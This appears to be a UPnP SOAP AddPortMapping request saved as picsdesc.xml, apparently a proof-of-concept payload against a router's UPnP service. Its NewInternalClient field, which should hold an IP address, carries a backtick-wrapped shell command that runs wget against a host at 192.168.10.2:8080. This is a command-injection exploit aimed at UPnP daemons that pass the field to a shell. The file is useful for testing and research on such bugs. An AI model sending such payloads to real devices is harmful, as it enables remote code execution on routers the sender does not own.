picsdesc.xml

<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <s:Body>
        <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
            <NewRemoteHost></NewRemoteHost>
            <NewExternalPort>47500</NewExternalPort>
            <NewProtocol>TCP</NewProtocol>
            <NewInternalPort>44382</NewInternalPort>
            <NewInternalClient>`wget http://192.168.10.2:8080`</NewInternalClient>
            <NewEnabled>1</NewEnabled>
            <NewPortMappingDescription>syncthing</NewPortMappingDescription>
            <NewLeaseDuration>0</NewLeaseDuration>
        </u:AddPortMapping>
    </s:Body>
</s:Envelope>